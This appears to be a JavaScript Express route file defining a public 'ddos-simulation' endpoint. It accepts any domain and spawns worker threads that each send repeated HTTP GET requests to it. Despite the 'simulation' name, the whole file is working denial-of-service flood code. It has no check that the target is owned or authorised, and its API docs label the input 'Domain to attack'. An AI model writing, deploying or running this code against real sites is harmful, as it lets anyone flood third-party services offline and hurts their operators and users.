import express from "express";
import axios from "axios";
import { Worker, isMainThread, parentPort, workerData } from "worker_threads";

const router = express.Router();

/**
 * @swagger
 * /public/features/ddos-simulation:
 *   post:
 *     summary: Start DDoS simulation
 *     description: Initiates a DDoS simulation against the specified domain using worker threads to send multiple requests.
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               domain:
 *                 type: string
 *                 description: Domain to attack
 *               numWorkers:
 *                 type: integer
 *                 description: Number of worker threads to use
 *               requestsPerWorker:
 *                 type: integer
 *                 description: Number of requests each worker should send
 *     responses:
 *       200:
 *         description: DDoS simulation started
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 */
router.post("/features/ddos-simulation", async (req, res) => {
  const { domain, numWorkers = 10, requestsPerWorker = 100 } = req.body;

  if (!domain) {
    return res.status(400).json({ message: "Domain is required." });
  }

  console.log("Target Domain: ", domain);

  const workers = [];

  for (let i = 0; i < numWorkers; i++) {
    const worker = new Worker(new URL(import.meta.url), {
      workerData: { domain, requestsPerWorker },
    });

    workers.push(worker);

    worker.on("exit", (code) => {
      console.log(`Worker exited with code ${code}`);
    });
  }

  res.status(200).json({ message: `DDoS simulation started on ${domain}.` });
});

if (!isMainThread) {
  const { domain, requestsPerWorker } = workerData;

  const sendRequests = async () => {
    for (let i = 0; i < requestsPerWorker; i++) {
      try {
        const response = await axios.get(domain);

        console.log(`Request to ${domain}: ${response.status}`);
      } catch (error) {
        console.error(`Error hitting ${domain}: ${error.message}`);
      }
    }
  };

  sendRequests();
}

export default router;
